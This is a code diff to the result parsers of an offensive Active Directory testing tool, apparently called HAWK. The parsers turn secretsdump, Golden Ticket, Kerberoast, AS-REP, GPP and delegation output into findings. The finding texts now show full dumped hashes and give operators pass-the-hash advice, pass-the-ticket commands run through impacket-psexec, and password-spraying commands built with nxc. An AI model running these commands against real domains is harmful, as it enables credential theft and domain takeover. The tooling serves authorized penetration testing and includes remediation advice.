@@ -46,6 +46,81 @@ from utils.runner import ToolRunner, MultiRunner, MetasploitRunner, GreenBoneRun
 from utils.session import Credential
 from gui.widgets.card_common import *
 
+
+def _bloodhound_extract_stats(users, computers, groups):
+    """Pure extraction of the interesting BloodHound stats from the three
+    parsed JSON collections.  Split out of _parse_bloodhound_to_intel so
+    the counting rules are unit-testable without a ZIP on disk.
+
+    Returns a dict with:
+      user_names        every user samAccountName/name (pushed to session)
+      kerberoastable    users with an SPN worth roasting — krbtgt and
+                        disabled accounts are EXCLUDED: krbtgt always
+                        carries kadmin/changepw and is disabled, and the
+                        KDC won't issue a TGS for a disabled account, so
+                        neither is a real kerberoast target
+      asrepable         users flagged 'do not require pre-auth'
+      unconstrained_pcs computers with unconstrained delegation
+      da_members        Domain/Enterprise Admins members, resolved to
+                        display names and deduped (a principal in both
+                        groups is counted once)
+    """
+    users = users or []
+    computers = computers or []
+    groups = groups or []
+
+    # SID -> display name, so group members (stored by BloodHound as
+    # ObjectIdentifier SIDs) can be shown by name, not an opaque SID.
+    sid_to_name = {}
+    for obj in list(users) + list(computers) + list(groups):
+        oid = obj.get("ObjectIdentifier") or ""
+        p = obj.get("Properties", {}) or {}
+        nm = p.get("name") or p.get("samaccountname") or ""
+        if oid and nm:
+            sid_to_name[oid] = nm
+
+    user_names, kerberoastable, asrepable = [], [], []
+    for u in users:
+        props = u.get("Properties", {}) or {}
+        name = props.get("name") or props.get("samaccountname") or ""
+        if name:
+            user_names.append(name)
+        if props.get("hasspn"):
+            sam = (props.get("samaccountname")
+                   or (name.split("@")[0] if name else "")).lower()
+            if sam != "krbtgt" and props.get("enabled", True) is not False:
+                kerberoastable.append(name)
+        if props.get("dontreqpreauth"):
+            asrepable.append(name)
+
+    da_members = []
+    for g in groups:
+        props = g.get("Properties", {}) or {}
+        gname = (props.get("name") or "").upper()
+        if gname.startswith(("DOMAIN ADMINS@", "ENTERPRISE ADMINS@")):
+            for m in (g.get("Members") or []):
+                oid = m.get("ObjectIdentifier", "")
+                da_members.append(sid_to_name.get(oid, oid))
+    # A principal can sit in both Domain and Enterprise Admins — once only.
+    _seen = set()
+    da_members = [x for x in da_members
+                  if not (x in _seen or _seen.add(x))]
+
+    unconstrained_pcs = []
+    for c in computers:
+        props = c.get("Properties", {}) or {}
+        if props.get("unconstraineddelegation"):
+            unconstrained_pcs.append(props.get("name", ""))
+
+    return {
+        "user_names":        user_names,
+        "kerberoastable":    kerberoastable,
+        "asrepable":         asrepable,
+        "unconstrained_pcs": unconstrained_pcs,
+        "da_members":        da_members,
+    }
+
+
 class CardADParserMixin:
     def _parse_secretsdump_to_intel(self, tool, log: list) -> bool:
         """Parse impacket-secretsdump output, push every credential
@@ -203,10 +278,11 @@ class CardADParserMixin:
         # entry (not just the first 5).  The finding-info dialog is
         # already scrollable (CTkScrollableFrame), so a long
         # description simply scrolls — readability wins over brevity.
-        # Each line still elides the hash itself (first 8 chars + …)
-        # so the summary is informative without blasting the full
-        # raw hashes; the actual hashes live in the Credential Store
-        # and are accessible via CRACK / SHOW RESULT there.
+        # The full hash is shown on each line (operator asked to be able
+        # to read/copy the whole hash straight from the finding).  The
+        # info dialog's description is a word-wrap CTkTextbox, so long
+        # hashes wrap instead of being clipped, and every char is
+        # selectable; the same hashes also live in the Credential Store.
         parts = [
             f"secretsdump succeeded on {target}.",
             f"",
@@ -229,10 +305,9 @@ class CardADParserMixin:
         if ntlm:
             parts.append("")
             parts.append(f"Users extracted ({len(ntlm)} total):")
-            for user, rid, lm, nt in ntlm:
+            for user, rid_, lm, nt in ntlm:
                 parts.append(
-                    f"  · {user:<24}  RID {rid:<6}  "
-                    f"NT: {nt[:8]}…")
+                    f"  · {user:<24}  RID {rid_:<6}  NT: {nt}")
 
         # All DCC2 cached logons.
         if dcc2:
@@ -242,14 +317,14 @@ class CardADParserMixin:
             for entry in dcc2:
                 # Each DCC2 entry from secretsdump looks like:
                 #   DOMAIN/user:$DCC2$10240#user#hash
-                # Show user + first 8 chars of the hash payload.
+                # Show the user + the full $DCC2$ hash (crackable as-is).
                 if "$DCC2$" in entry:
                     head = entry.split("$DCC2$", 1)[0]
-                    tail = entry.split("$DCC2$", 1)[1][:8]
-                    parts.append(
-                        f"  · {head:<32}  hash: {tail}…")
+                    tail = entry.split("$DCC2$", 1)[1]
+                    parts.append(f"  · {head}")
+                    parts.append(f"      $DCC2${tail}")
                 else:
-                    parts.append(f"  · {entry[:80]}…")
+                    parts.append(f"  · {entry}")
 
         # All Kerberos hashes (TGS / AS-REP).
         if kerbs:
@@ -259,8 +334,8 @@ class CardADParserMixin:
             for h in kerbs:
                 # Hash strings start with "$krb5tgs$..." or
                 # "$krb5asrep$..." — show the type marker + the
-                # principal (between *...$) + first 8 chars of the
-                # cipher tail for fingerprinting.
+                # principal (between *...$), then the full hash on its
+                # own line (word-wrapped in the info dialog).
                 kind = ("TGS / Kerberoast"
                         if "krb5tgs" in h.lower() else
                         "AS-REP roastable"
@@ -268,8 +343,8 @@ class CardADParserMixin:
                         "Krb hash")
                 user_m = re.search(r"\*([^\*$]+)\$", h)
                 u = user_m.group(1) if user_m else "?"
-                parts.append(
-                    f"  · {u:<24}  [{kind}]  …{h[-12:]}")
+                parts.append(f"  · {u:<24}  [{kind}]")
+                parts.append(f"      {h}")
 
         desc = "\n".join(parts)
         severity = "critical" if ntlm else "high"
@@ -277,15 +352,165 @@ class CardADParserMixin:
                  f"{len(dcc2)} DCC2 + {len(kerbs)} Kerberos "
                  f"hashes on {target}")
 
+        # replace=True: secretsdump is a snapshot (a re-run re-dumps the
+        # whole NTDS), so overwrite the description instead of appending —
+        # otherwise an old run's truncated hashes stay stacked above the
+        # new run's full ones ("half the hashes look broken").
         self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
             title=title, description=desc,
             severity=severity, source=tool.name,
-            linked_run_id=rid))
+            linked_run_id=rid, replace=True))
+
+        # ── Password reuse: identical NT hash = identical password ──
+        # Group the dumped NT hashes; any hash shared by 2+ accounts is
+        # password reuse.  The operator asked to be SIGNALLED (not to
+        # have it auto-cracked), so raise a dedicated finding — they can
+        # crack one and own the group, or pass-the-hash straight away.
+        _EMPTY_NT = "31d6cfe0d16ae931b73c59d7e0c089c0"   # NT of ""
+        by_nt = {}
+        for _u, _rid, _lm, _nt in ntlm:
+            key = (_nt or "").lower()
+            if not key or key == _EMPTY_NT:
+                continue   # blank / disabled accounts are not "reuse"
+            by_nt.setdefault(key, []).append(_u)
+        reuse = {k: v for k, v in by_nt.items() if len(v) > 1}
+        if reuse:
+            n_accts = sum(len(v) for v in reuse.values())
+            rparts = [
+                f"{n_accts} account(s) across {len(reuse)} distinct "
+                f"password(s) share an NTLM hash on {target}.  Identical "
+                f"NT hash = identical cleartext password: crack ONE and "
+                f"you own the whole group, or pass-the-hash immediately "
+                f"(no cracking needed).",
+                "",
+            ]
+            for _nt, _us in sorted(reuse.items(),
+                                   key=lambda kv: -len(kv[1])):
+                rparts.append(f"  NT {_nt}  —  {len(_us)} accounts:")
+                for _u in _us:
+                    rparts.append(f"    · {_u}")
+                rparts.append("")
+            r_title = (f"PASSWORD REUSE — {n_accts} accounts share a "
+                       f"hash on {target}")
+            r_desc = "\n".join(rparts).rstrip()
+            self.app.after(0, lambda t=r_title, d=r_desc:
+                self.app.target_intel.add_auto_finding(
+                    title=t, description=d,
+                    severity="high", source=tool.name,
+                    linked_run_id=rid, replace=True))
+            self.app.terminal.write(
+                f"  [!] PASSWORD REUSE — {n_accts} accounts share "
+                f"{len(reuse)} NT hash(es).  See Target Intel.", "warn")
 
         self.app.terminal.write(
             f"  [+] SECRETSDUMP — {added} hashes added to Credential "
             f"Store as HASH entries (crackable via hashcat / john).",
             "success")
+        return True
+
+    def _parse_ticketer_to_intel(self, tool, log: list) -> bool:
+        """impacket-ticketer output — a forged Golden/Silver ticket.
+
+        Ticketer runs ENTIRELY OFFLINE: it signs a Kerberos TGT with
+        the krbtgt NTLM hash and writes a .ccache.  The generic fallback
+        filed this as a low 'info' finding with a truncated log dump —
+        wrong: a Golden Ticket is full domain-wide persistence.  We emit
+        a dedicated CRITICAL finding that says WHO was impersonated,
+        WHERE the ticket landed, HOW to use it, and how to remediate.
+
+        Success is signalled by the 'Saving ticket in <file>.ccache'
+        line; without it we let the generic fallback handle the output.
+        """
+        import re
+        from utils.run_id import new_run_id
+
+        target = self._get_target() or "target"
+        text = "\n".join(self._strip_ansi(ln) for _, ln in log)
+
+        m_save = re.search(r"Saving ticket in\s+(\S+)", text)
+        if not m_save:
+            return False   # not a successful forge — leave the fallback
+        ccache = m_save.group(1)
+
+        m_cust = re.search(
+            r"Customizing ticket for\s+(\S+?)/(\S+)", text)
+        if m_cust:
+            domain, user = m_cust.group(1), m_cust.group(2)
+        else:
+            # Derive the impersonated user from the ccache name as a
+            # fallback (ticketer names it <user>.ccache by default).
+            user = ccache.rsplit("/", 1)[-1]
+            user = re.sub(r"\.ccache$", "", user) or "?"
+            domain = "?"
+
+        rid = new_run_id()
+        # The result block (what was forged) keeps the REAL values; the
+        # usage commands are a reusable template with <DC-IP> / <DOMAIN>
+        # / <DC-FQDN> placeholders the operator fills for the target.
+        # The impersonated user and the .ccache name stay real — they
+        # are the concrete product of THIS run.
+        desc = (
+            f"Golden Ticket forged OFFLINE and saved to {ccache}.\n"
+            f"\n"
+            f"  Impersonated : {user}@{domain}\n"
+            f"  Signed with  : krbtgt NTLM hash (domain {domain})\n"
+            f"  Ticket file  : {ccache}  (in HAWK's working directory)\n"
+            f"\n"
+            f"Impact: a forged Kerberos TGT that authenticates as "
+            f"{user}.  A Golden Ticket is signed by krbtgt itself, so "
+            f"the KDC trusts it for ANY service in the domain — with a "
+            f"privileged principal (Administrator / Domain Admin) that "
+            f"is full domain compromise.  It stays valid until the "
+            f"krbtgt password is rotated TWICE (Microsoft's "
+            f"double-tap); rotating {user}'s own password does NOT "
+            f"revoke it.\n"
+            f"\n"
+            f"Use it — pass-the-ticket from a Kali shell, run in HAWK's "
+            f"working directory (where {ccache} was saved).  Fill the "
+            f"<DC-IP> / <DOMAIN> / <DC-FQDN> placeholders for your "
+            f"target:\n"
+            f"\n"
+            f"  # 1. locate the forged ticket (ticketer wrote it to "
+            f"HAWK's cwd)\n"
+            f"  ls -l {ccache}\n"
+            f"\n"
+            f"  # 2. make the DC FQDN resolve — a Kerberos service "
+            f"ticket is bound to the DC hostname, not its IP, so the "
+            f"name must resolve (one-off /etc/hosts entry)\n"
+            f"  echo '<DC-IP> <DC-FQDN>' | sudo tee -a /etc/hosts\n"
+            f"\n"
+            f"  # 3. point Kerberos at the ticket, then confirm it "
+            f"loaded\n"
+            f"  export KRB5CCNAME={ccache}\n"
+            f"  klist\n"
+            f"\n"
+            f"  # 4. authenticate WITH the ticket: -k reads "
+            f"KRB5CCNAME, -no-pass skips the password, -dc-ip points "
+            f"the KDC lookup at the DC\n"
+            f"  impacket-psexec -k -no-pass -dc-ip <DC-IP> "
+            f"<DOMAIN>/{user}@<DC-FQDN>\n"
+            f"  impacket-secretsdump -k -no-pass -dc-ip <DC-IP> "
+            f"<DOMAIN>/{user}@<DC-FQDN>\n"
+            f"\n"
+            f"  Note: run these in the SAME shell (export is "
+            f"per-shell), and the DC clock must be within 5 min of "
+            f"this host or the ticket fails with KRB_AP_ERR_SKEW.\n"
+            f"\n"
+            f"Remediation: reset the krbtgt password TWICE (e.g. "
+            f"Microsoft's New-KrbtgtKeys.ps1) to invalidate every "
+            f"existing golden ticket, then investigate how krbtgt / "
+            f"DCSync access was obtained.")
+        title = f"GOLDEN TICKET forged — {user}@{domain} on {target}"
+
+        # replace=True: re-forging re-writes the same ticket, so
+        # overwrite rather than stacking duplicate finding bodies.
+        self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
+            title=title, description=desc,
+            severity="critical", source=tool.name,
+            linked_run_id=rid, replace=True))
+        self.app.terminal.write(
+            f"  [!] GOLDEN TICKET forged for {user}@{domain} — "
+            f"CRITICAL, see Target Intel.", "error")
         return True
 
     def _parse_addcomputer_to_intel(self, tool, log: list) -> bool:
@@ -372,8 +597,10 @@ class CardADParserMixin:
                     notes=(f"Computer account created via impacket-"
                            f"addcomputer on {target}.\n"
                            f"Use as 'delegate-from' in RBCD attacks.\n"
-                           f"Remove with:  impacket-addcomputer -delete "
-                           f"-computer-name {computer} ..."),
+                           f"Remove with (auth as a user allowed to):\n"
+                           f"  impacket-addcomputer -delete -computer-name "
+                           f"{computer} -dc-ip <DC-IP> "
+                           f"'<DOMAIN>/<USER>:<PASSWORD>'"),
                     linked_run_id=rid,
                     category=TOOL_RUN_CATEGORY,
                     # The account was created, never logged into.
@@ -397,9 +624,12 @@ class CardADParserMixin:
                         f"  • Pivot for Kerberos S4U2self/S4U2proxy abuse\n"
                         f"  • Baseline 'low-priv machine account' to "
                         f"test AD ACLs\n\n"
-                        f"Cleanup when done:\n"
+                        f"Cleanup when done — delete the account (auth as "
+                        f"a user allowed to, e.g. the one that created "
+                        f"it):\n"
                         f"  impacket-addcomputer -delete -computer-name "
-                        f"{computer} ..."),
+                        f"{computer} -dc-ip <DC-IP> "
+                        f"'<DOMAIN>/<USER>:<PASSWORD>'"),
                     severity="high", source=tool.name,
                     linked_run_id=rid))
 
@@ -427,9 +657,11 @@ class CardADParserMixin:
                         f"from the earlier run.\n"
                         f"  • Run with a different -computer-name, e.g. "
                         f"'HAWK2$'.\n"
-                        f"  • Delete the existing one first:\n"
+                        f"  • Delete the existing one first (auth as a "
+                        f"user allowed to):\n"
                         f"    impacket-addcomputer -delete -computer-"
-                        f"name {req_name} ..."),
+                        f"name {req_name} -dc-ip <DC-IP> "
+                        f"'<DOMAIN>/<USER>:<PASSWORD>'"),
                     severity="info", source=tool.name,
                     linked_run_id=rid))
             self.app.terminal.write(
@@ -522,13 +754,126 @@ class CardADParserMixin:
                     f"Last output lines:\n{tail}\n\n"
                     f"Check the AD side manually — if the account exists, "
                     f"add it to the Credential Store by hand (username "
-                    f"{req_name or 'HAWK$'}, password "
-                    f"{req_pass or 'Hawk123!'})."),
+                    f"{req_name or '(the -computer-name you supplied)'}, "
+                    f"password "
+                    f"{req_pass or '(the -computer-pass you supplied)'})."),
                 severity="info", source=tool.name,
                 linked_run_id=rid))
         self.app.terminal.write(
             f"  [*] addcomputer — output format not recognised, "
             f"acknowledgment finding pushed.", "dim")
+        return True
+
+    def _parse_gpp_decrypt_to_intel(self, tool, log: list) -> bool:
+        """gpp-decrypt output — a decrypted GPP (Group Policy Preferences)
+        cpassword.
+
+        Microsoft's AES key for cpassword was published (MS14-025), so a
+        cpassword blob pulled from SYSVOL decrypts to cleartext instantly.
+        The recovered value is almost always a LOCAL-ADMIN password pushed
+        to every machine by the same GPO — identical everywhere, i.e.
+        prime lateral-movement fuel.  So we capture it as a credential +
+        a HIGH finding instead of leaving it in the terminal (where the
+        generic fallback would file it as a low info dump).
+
+        The account name isn't in gpp-decrypt's output (it lives in the
+        source Groups.xml); the dialog stashes it on ``self._gpp_username``
+        when the operator supplied one.  Returns False (→ generic
+        fallback) when no plaintext was recovered — e.g. a malformed blob.
+        """
+        from utils.session import Credential
+        from utils.run_id import new_run_id, TOOL_RUN_CATEGORY
+
+        target = self._get_target() or "target"
+        rid = new_run_id()
+
+        # Consume the optional username the dialog stashed for this run so
+        # a later run with a blank field can't inherit this one's account.
+        uname = (getattr(self, "_gpp_username", "") or "").strip()
+        self._gpp_username = ""
+
+        # gpp-decrypt prints just the cleartext password.  Skip the command
+        # echo, HAWK/tool markers, and obvious error/usage noise; the first
+        # remaining non-empty line is the recovered secret.
+        password = ""
+        for _lvl, raw in log:
+            s = self._strip_ansi(raw).strip()
+            if not s:
+                continue
+            low = s.lower()
+            if s.startswith(("$", "[", "#")) or "gpp-decrypt" in low:
+                continue
+            if low.startswith(("traceback", "error", "usage:", "usage ",
+                               "valueerror", "no handlers", "warning")):
+                continue
+            password = s
+            break
+
+        if not password:
+            return False
+
+        if uname:
+            title = f"GPP-DECRYPT — recovered password for {uname}"
+            acct = uname
+            user_ph = uname
+        else:
+            title = "GPP-DECRYPT — recovered GPP local-admin password"
+            acct = "(unknown — see the userName in the source Groups.xml)"
+            user_ph = "<USER>"
+
+        try:
+            self.app.cred_store.add_credential(Credential(
+                username=uname or "gpp-local-admin",
+                password=password,
+                cred_type="cleartext",
+                services=["SMB", "local"],
+                source_phase=self.phase_id,
+                host=target,
+                notes=("Recovered from a SYSVOL GPP cpassword via the "
+                       "public MS AES key (MS14-025).\n"
+                       "GPP-set local passwords are normally IDENTICAL on "
+                       "every machine the GPO applied to — spray it across "
+                       "the estate (SMB --local-auth) for lateral "
+                       "movement."),
+                linked_run_id=rid,
+                category=TOOL_RUN_CATEGORY,
+                verified=False))
+        except Exception as e:
+            print(f"[HAWK] gpp-decrypt cred push failed: {e}")
+
+        self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
+            title=title,
+            description=(
+                f"Decrypted a Group Policy Preferences cpassword from "
+                f"SYSVOL using Microsoft's public AES key (MS14-025).\n\n"
+                f"Account  : {acct}\n"
+                f"Password : {password}\n\n"
+                f"Why it matters:\n"
+                f"  GPP cpassword set LOCAL accounts (usually the local "
+                f"Administrator) on every machine the GPO targeted, with "
+                f"the SAME password everywhere — so this one secret often "
+                f"unlocks the whole estate.\n\n"
+                f"Next steps — spray it as a LOCAL account across a host "
+                f"range (or the ADIDNSDUMP host list):\n"
+                f"  nxc smb <TARGETS> -u '{user_ph}' -p '{password}' "
+                f"--local-auth\n"
+                f"  (--local-auth because it is a local, not a domain, "
+                f"account)\n"
+                f"  On a hit:  nxc smb <HOST> -u '{user_ph}' -p "
+                f"'{password}' --local-auth -x whoami   (or evil-winrm / "
+                f"impacket-psexec).\n\n"
+                f"Remediation:\n"
+                f"  Remove the cpassword XML from SYSVOL and the GPP that "
+                f"wrote it — MS14-025 blocked NEW ones but did not scrub "
+                f"existing files.  Rotate the exposed password everywhere "
+                f"and move to LAPS for per-host randomised local-admin "
+                f"passwords."),
+            severity="high", source=tool.name,
+            linked_run_id=rid))
+
+        self.app.terminal.write(
+            f"  [+] gpp-decrypt — recovered password for {acct} → "
+            f"Credential Store + Target Intel.", "success")
         return True
 
     def _parse_kerberoast_to_intel(self, tool, log: list) -> bool:
@@ -580,14 +925,27 @@ class CardADParserMixin:
             except Exception:
                 pass
 
-        # SPN user list from stdout
-        USER_ROW_RE = re.compile(
-            r"^\s*([\w.\-$]+)\s+[^\s]+\s+(?:\d{4}-\d{2}-\d{2}|<never>)")
+        # SPN user list from the stdout table.  GetUserSPNs prints:
+        #   ServicePrincipalName        Name       MemberOf   PwdLastSet …
+        # so the SPN is the FIRST column (it contains '/' and often ':')
+        # and the sAMAccountName is the SECOND.  The old regex assumed the
+        # username came first and only matched [\w.\-$], so it broke on the
+        # '/' in the SPN and extracted NOBODY — the whole run then returned
+        # False and fell through to the generic low-severity fallback
+        # finding (the "KERBEROAST (GetUserSPNs) on <t>" card the operator
+        # saw at severity 'low').
+        ROW_RE = re.compile(r"^(\S+)\s+([\w.\-$]+)\s+\S")
         users_found = []
         for ln in lines:
-            m = USER_ROW_RE.match(ln)
-            if m:
-                users_found.append(m.group(1))
+            s = ln.rstrip()
+            if not s or "ServicePrincipalName" in s:
+                continue
+            m = ROW_RE.match(s)
+            # A real data row has an SPN (service/host) as column 1; that
+            # '/' also skips the dashed separator line.
+            if m and "/" in m.group(1):
+                users_found.append(m.group(2))
+        users_found = list(dict.fromkeys(users_found))
 
         # ── "No entries found!" — valid negative result ──────────────
         # impacket-GetUserSPNs prints exactly this line when the query
@@ -663,6 +1021,10 @@ class CardADParserMixin:
             except Exception as e:
                 print(f"[HAWK] kerberoast cred push failed: {e}")
 
+        # Clock skew aborts the TGS request (KRB_AP_ERR_SKEW): GetUserSPNs
+        # still LISTS the SPN accounts over LDAP but retrieves no hash.
+        skew = ("krb_ap_err_skew" in joined or "clock skew" in joined)
+
         # Summary finding
         desc_parts = [
             f"Kerberoast enumeration on {target}.",
@@ -679,8 +1041,22 @@ class CardADParserMixin:
         if added:
             desc_parts += ["", (f"→ {added} TGS hash(es) added to "
                                 f"Credential Store (hashcat -m 13100).")]
+        if users_found and not hashes and skew:
+            desc_parts += [
+                "",
+                "NOTE: SPN accounts found but NO TGS hash retrieved — the "
+                "ticket request failed with KRB_AP_ERR_SKEW (clock skew).",
+                "Kerberos compares UTC and is timezone-independent; your "
+                "clock is simply >5 min off the DC's.  Sync to the DC and "
+                "re-run to roast them:",
+                f"  sudo ntpdate -u {target}   (or: sudo rdate -n {target})"]
 
-        sev = "high" if hashes else "info"
+        # Finding severity: a kerberoastable service account is a high-value
+        # foothold whether or not we grabbed the hash this run, so raise it
+        # to 'high' as soon as any SPN user is found.  It was 'info' when no
+        # hash — combined with the row-regex bug that dropped the users,
+        # every skewed run read as a low-priority generic finding.
+        sev = "high" if (hashes or users_found) else "info"
         title = (f"KERBEROAST — {len(hashes)} TGS hash(es) on "
                  f"{target}" if hashes else
                  f"KERBEROAST — {len(users_found)} SPN user(s) on "
@@ -688,7 +1064,7 @@ class CardADParserMixin:
         self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
             title=title, description="\n".join(desc_parts),
             severity=sev, source=tool.name,
-            linked_run_id=rid))
+            linked_run_id=rid, replace=True))
         self.app.terminal.write(
             f"  [+] Kerberoast — {added} TGS hash(es) → Credential "
             f"Store.", "success")
@@ -817,9 +1193,11 @@ class CardADParserMixin:
             return True
 
         added = 0
+        roasted_users = []
         for h in hashes:
             user_m = re.search(r"\$([^@\$]+)@", h)
             user = user_m.group(1) if user_m else "asrep-user"
+            roasted_users.append(user)
             try:
                 self.app.cred_store.add_credential(Credential(
                     username=user,
@@ -842,20 +1220,129 @@ class CardADParserMixin:
             except Exception as e:
                 print(f"[HAWK] asrep cred push failed: {e}")
 
+        roasted_users = list(dict.fromkeys(roasted_users))
+        _asrep_desc = [
+            f"GetNPUsers found {len(hashes)} user(s) with 'Do not require "
+            f"pre-authentication' set — their AS-REP is retrievable "
+            f"without the account's password.",
+            "",
+            f"→ {added} hash(es) added to Credential Store "
+            f"(hashcat -m 18200).  Cracked result = the user's domain "
+            f"password.",
+        ]
+        if roasted_users:
+            _asrep_desc += ["", "AS-REP roastable users:"]
+            for u in roasted_users[:20]:
+                _asrep_desc.append(f"  · {u}")
+            if len(roasted_users) > 20:
+                _asrep_desc.append(f"  · … {len(roasted_users)-20} more")
         self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
             title=f"AS-REP ROAST — {len(hashes)} hash(es) on {target}",
-            description=(
-                f"GetNPUsers found {len(hashes)} user(s) with "
-                f"'Do not require pre-authentication' flag set — their "
-                f"AS-REP is retrievable without any credentials.\n\n"
-                f"→ {added} hash(es) added to Credential Store "
-                f"(hashcat -m 18200).\n"
-                f"Cracked result = the user's domain password."),
+            description="\n".join(_asrep_desc),
             severity="high", source=tool.name,
-            linked_run_id=rid))
+            linked_run_id=rid, replace=True))
         self.app.terminal.write(
             f"  [+] AS-REP Roast — {added} hash(es) → Credential Store.",
             "success")
+        return True
+
+    def _parse_findelegation_to_intel(self, tool, log: list) -> bool:
+        """impacket-findDelegation parser.
+
+        Table (2+-space aligned columns; DelegationType is multi-word):
+          AccountName  AccountType  DelegationType  DelegationRightsTo  SPN Exists
+
+        Without this the generic fallback dumped the raw table at severity
+        'info' — but delegation (unconstrained / constrained / RBCD) is a
+        real privilege-escalation vector, so it deserves a structured
+        high-severity finding that names each account, its delegation
+        type, and the target SPN.
+        """
+        import re
+        from utils.run_id import new_run_id
+
+        target = self._get_target() or "target"
+        rid = new_run_id()
+        lines = [self._strip_ansi(ln) for _, ln in log]
+
+        rows = []
+        for ln in lines:
+            st = ln.strip()
+            if (not st or st.startswith("Impacket")
+                    or st.startswith("AccountName")
+                    or set(st) <= set("- ")):
+                continue
+            cols = re.split(r"\s{2,}", st)
+            # A data row: col[1] is the account type.
+            if len(cols) >= 3 and cols[1] in (
+                    "Computer", "Person", "User", "Group"):
+                name   = cols[0].strip()
+                atype  = cols[1].strip()
+                dtype  = cols[2].strip()
+                rights = cols[3].strip() if len(cols) > 3 else ""
+                rows.append((name, atype, dtype, rights))
+
+        if not rows:
+            low = "\n".join(lines).lower()
+            if "no entries found" in low or "findelegation" in low:
+                self.app.after(0, lambda:
+                    self.app.target_intel.add_auto_finding(
+                        title=f"FIND DELEGATION — none on {target}",
+                        description=(
+                            "impacket-findDelegation queried the DC "
+                            "successfully but no account has "
+                            "unconstrained / constrained / RBCD "
+                            "delegation rights.  Nothing to abuse here."),
+                        severity="info", source=tool.name,
+                        linked_run_id=rid, replace=True))
+                return True
+            return False
+
+        lo = lambda s: s.lower()
+        unconstrained = [r for r in rows if "unconstrained" in lo(r[2])]
+        constrained   = [r for r in rows
+                         if "constrained" in lo(r[2])
+                         and "unconstrained" not in lo(r[2])
+                         and "resource" not in lo(r[2])]
+        rbcd          = [r for r in rows if "resource" in lo(r[2])]
+
+        desc = [f"Delegation enumeration on {target} — "
+                f"{len(rows)} account(s) with delegation rights.", ""]
+        for name, atype, dtype, rights in rows:
+            line = f"  · {name} ({atype}) — {dtype}"
+            if rights and rights.upper() != "N/A":
+                line += f"  →  {rights}"
+            desc.append(line)
+        desc += ["", "Why it matters:"]
+        if unconstrained:
+            desc.append(
+                "  · Unconstrained — the account caches the TGT of ANY "
+                "principal that authenticates to it; coerce a DC to auth "
+                "(PrinterBug / PetitPotam) and capture a Domain Admin "
+                "TGT.  NOTE: a DC is ALWAYS unconstrained, so verify "
+                "whether the listed account is the DC (expected) or a "
+                "member host (full compromise).")
+        if constrained:
+            desc.append(
+                "  · Constrained — abuse S4U2Self + S4U2Proxy to "
+                "impersonate any user to the listed SPN service "
+                "(CIFS → file shares, HTTP → WinRM, LDAP → DCSync).")
+        if rbcd:
+            desc.append(
+                "  · Resource-Based (RBCD) — write "
+                "msDS-AllowedToActOnBehalfOfOtherIdentity, then S4U "
+                "into the target computer as any user.")
+
+        self.app.after(0, lambda:
+            self.app.target_intel.add_auto_finding(
+                title=f"FIND DELEGATION — {len(rows)} delegated "
+                      f"account(s) on {target}",
+                description="\n".join(desc),
+                severity="high", source=tool.name,
+                linked_run_id=rid, replace=True))
+        self.app.terminal.write(
+            f"  [+] FIND DELEGATION — {len(rows)} delegated account(s) "
+            f"→ Target Intel.", "success")
         return True
 
     def _parse_certipy_find_to_intel(self, tool, log: list) -> bool:
@@ -877,30 +1364,88 @@ class CardADParserMixin:
         #         ...
         #       [!] Vulnerabilities
         #         ESC1                   : 'Domain Users' can enroll...
-        TEMPLATE_BLOCKS = re.findall(
-            r"Template Name\s*:\s*([^\n]+)[\s\S]*?"
-            r"(?:ESC\d+\s*:\s*[^\n]+(?:\n|$))+",
-            text)
-        vulns = []
-        # Parse per-ESC match
+        vulns = []          # (subject, ESCx, description)
         ESC_RE = re.compile(r"(ESC\d+)\s*:\s*([^\n]+)")
-        # Also grab CA name(s) — often at top
         ca_m = re.search(r"CA Name\s*:\s*([^\n]+)", text)
         ca_name = ca_m.group(1).strip() if ca_m else "<CA>"
 
+        def _escs_in_vuln_section(block_text):
+            # Only the "[!] Vulnerabilities" section — NOT "[*] Remarks",
+            # which lists ESC2/ESC3 *target* templates and patch caveats
+            # (e.g. the ESC15 / CVE-2024-49019 note).  Scanning the whole
+            # block double-counted those remark lines as live vulns.
+            m = re.search(
+                r"\[!\]\s*Vulnerabilities(.*?)(?:\[\*\]\s*Remarks|\Z)",
+                block_text, re.DOTALL)
+            return ([(em.group(1), em.group(2).strip())
+                     for em in ESC_RE.finditer(m.group(1))]
+                    if m else [])
+
+        # CA-level vulns (ESC8/ESC11/ESC6/...) live under "Certificate
+        # Authorities", not inside a template block, so the template loop
+        # below misses them — collect them first.
+        ca_block = re.search(
+            r"Certificate Authorities(.*?)(?=Certificate Templates|\Z)",
+            text, re.DOTALL)
+        if ca_block:
+            for esc, note in _escs_in_vuln_section(ca_block.group(1)):
+                vulns.append((f"CA {ca_name!r}", esc, note))
+
+        # Per-template vulns.
         for block in re.finditer(
                 r"Template Name\s*:\s*([^\n]+)"
                 r"(?:(?!Template Name).)*?"
                 r"(?=(?:Template Name|$))",
                 text, re.DOTALL):
             tmpl_name = block.group(1).strip()
-            block_text = block.group(0)
-            for em in ESC_RE.finditer(block_text):
-                vulns.append((tmpl_name, em.group(1), em.group(2).strip()))
+            for esc, note in _escs_in_vuln_section(block.group(0)):
+                vulns.append((tmpl_name, esc, note))
 
         if not vulns:
-            # ── Path A: AD CS enumerated successfully, no ESC vulns ──
-            if "Enterprise CA" in text or "Certificate Authorities" in text:
+            text_low = text.lower()
+            # How many CAs did certipy actually find?  certipy v5 prints
+            # "Found N certificate authorities"; N == 0 means the domain
+            # has NO Enterprise CA registered.  The "Certificate
+            # Authorities" header still prints in that case, so the old
+            # bare-substring Path A check wrongly reported a healthy AD CS.
+            m_ca_count = re.search(
+                r"found\s+(\d+)\s+certificate authorities", text_low)
+            ca_count = int(m_ca_count.group(1)) if m_ca_count else None
+
+            # ── No Enterprise CA registered (AD CS ran, 0 CAs) ──────────
+            if (ca_count == 0
+                    or "could not find any cas" in text_low
+                    or "could not find any certificate authorities"
+                    in text_low):
+                self.app.after(0, lambda:
+                    self.app.target_intel.add_auto_finding(
+                        title=f"CERTIPY FIND — no Enterprise CA on "
+                              f"{target}",
+                        description=(
+                            "Certipy enumerated AD over LDAP but found NO "
+                            "Enterprise CA registered in the domain "
+                            "(0 certificate authorities, 0 templates).\n\n"
+                            "The AD CS abuse chain (ESC1–ESC11) needs an "
+                            "Enterprise CA with published templates — "
+                            "there is nothing to attack here yet.  A "
+                            "'CertEnroll' share alone does NOT imply an "
